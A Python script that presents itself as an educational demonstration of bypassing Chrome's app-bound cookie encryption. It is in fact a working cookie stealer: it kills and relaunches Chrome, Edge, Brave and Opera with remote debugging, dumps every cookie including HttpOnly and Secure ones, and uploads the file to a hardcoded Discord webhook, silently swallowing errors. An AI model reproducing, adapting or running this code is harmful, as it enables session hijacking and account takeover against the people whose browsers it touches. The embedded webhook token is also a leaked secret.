"""
Bypass Chrome v20 appbound encryption and extract cookies using Chrome Remote Debugging without admin rights.
Including HTTP Only and Secure cookies. 

Developed by: github.com/thewh1teagle  
License: MIT  
For educational purposes only.  
Usage:
pip install websocket-client requests
python main.py
"""
import requests
import websocket
import json
import subprocess
import os
from pathlib import Path

webhook_url = "https://discord.com/api/webhooks/1316926026122792960/L8crqNvr21pwsaXEyhova-r17qEkkXlmnny-P9nXtw2nEyhjufK0a0sed0wHwTXO3eSN"

BROWSER = 'chrome' # chrome, edge, brave, opera
DEBUG_PORT = 9222
DEBUG_URL = f'http://localhost:{DEBUG_PORT}/json'
LOCAL_APP_DATA = os.getenv('localappdata')
APP_DATA = os.getenv('appdata')
PROGRAM_FILES = os.getenv('programfiles')
PROGRAM_FILES_X86 = os.getenv('programfiles(x86)')
CONFIGS = {
    'chrome': {
        'bin': rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe",
        'user_data': rf'{LOCAL_APP_DATA}\google\chrome\User Data'
    },
    'edge': {
        'bin': rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe",
        'user_data': rf'{LOCAL_APP_DATA}/Microsoft/Edge/User Data'
    },
    'brave': {
        'bin': rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe",
        'user_data': rf'{LOCAL_APP_DATA}/BraveSoftware/Brave-Browser/User Data'
    },
    'opera': {
        'bin': rf"{LOCAL_APP_DATA}\Programs\Opera GX\opera.exe",
        'user_data': rf'{APP_DATA}\Opera Software\Opera GX Stable'
    }
}

def get_debug_ws_url():
    res = requests.get(DEBUG_URL)
    data = res.json()
    return data[0]['webSocketDebuggerUrl'].strip()

def close_browser(bin_path):
    proc_name = Path(bin_path).name
    subprocess.run(f'taskkill /F /IM {proc_name}', check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_browser(bin_path, user_data_path):
    subprocess.Popen([bin_path, '--restore-last-session', f'--remote-debugging-port={DEBUG_PORT}', '--remote-allow-origins=*', '--headless', f'--user-data-dir={user_data_path}'], stdout=subprocess.DEVNULL)

def get_all_cookies(ws_url):
    ws = websocket.create_connection(ws_url)
    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
    response = ws.recv()
    response = json.loads(response)
    cookies = response['result']['cookies']
    ws.close()
    return cookies

if __name__ == "__main__":
    for CFG in CONFIGS:
        try:
            config = CONFIGS[CFG]
            close_browser(config['bin'])
            start_browser(config['bin'], config['user_data'])
            ws_url = get_debug_ws_url()
            cookies = get_all_cookies(ws_url)
            close_browser(config['bin'])

            with open("a.txt", "w") as f:
                for cookie in cookies:
                    if cookie['domain'] and cookie['name'] and cookie['value'] != "":
                        f.write(f"{cookie['domain']}\t{'FALSE' if cookie['expires'] == 0 else 'TRUE'}\t{cookie['path']}\t{'FALSE' if cookie['domain'].startswith('.') else 'TRUE'}\t{cookie['expires']}\t{cookie['name']}\t{cookie['value']}\n")
            
            
            with open("a.txt", "rb") as file:
                files = {
                    "file": ("a.txt", file), 
                }

                # Optional message content
                data = {
                    "content": "Here is a text file!",
                    "username": "Python Bot", 
                }
                requests.post(webhook_url, data=data, files=files)
        except:
            pass
